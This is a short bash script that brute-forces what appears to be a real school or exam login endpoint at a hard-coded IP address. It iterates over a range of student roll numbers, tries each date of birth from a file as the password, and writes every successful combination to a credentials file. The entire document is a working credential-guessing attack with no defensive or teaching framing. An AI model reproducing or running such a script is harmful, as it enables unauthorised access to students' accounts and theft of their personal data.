i=0
for i in {15..48}
do
while read  line 
do
echo "roll=PAS076BME0"$i"&dob="$line;
if [ $(curl --data "roll=PAS076BME0"$i"&dob="$line http://202.70.84.165/ajax_login.php) == "yes" ];
then
echo "roll=PAS076BME0"$i"&dob="$line >> crediantials;
break ;
fi 
done < dobs
done 

